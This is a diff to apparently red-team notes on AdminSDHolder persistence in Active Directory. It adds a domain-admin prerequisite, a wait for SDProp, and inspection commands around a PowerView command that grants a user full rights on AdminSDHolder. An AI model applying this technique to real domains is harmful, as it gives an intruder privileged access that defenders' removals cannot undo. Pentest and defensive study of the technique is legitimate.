@@ -1,5 +1,7 @@
 # AdminSDHolder
 
+## Permissions: Domain Admin
+
 ### The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
 
 ### If you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
@@ -18,6 +20,11 @@
 
     Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
 
+Then wait for SDProp process to run. It may take up to 60 minutes. After waiting, run the command below to inspect if the user has been added as a domain admin
+
 ### Inspection
 
     Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs
+
+    Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Moe'}
+
